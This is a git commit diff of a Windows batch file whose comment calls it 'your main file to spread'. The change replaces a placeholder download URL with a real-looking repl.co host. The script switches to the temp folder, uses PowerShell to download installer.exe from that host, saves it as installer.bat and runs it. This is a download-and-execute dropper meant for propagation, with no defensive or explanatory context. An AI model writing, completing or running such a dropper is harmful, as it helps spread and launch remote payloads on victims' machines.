51d6c0dd7b0e33f2b0d13a8f61f92561310e6dfb
Dogwagtail <124264073+Dogwagtail@users.noreply.github.com>
2023-02-02 07:21:26 -0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,5 +1,5 @@
 REM - This is your main file to spread.
 
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
+Powershell -Command "Invoke-Webrequest 'https://replname.wnetmc.repl.co/installer.exe' -OutFile installer.bat"
 start installer.bat
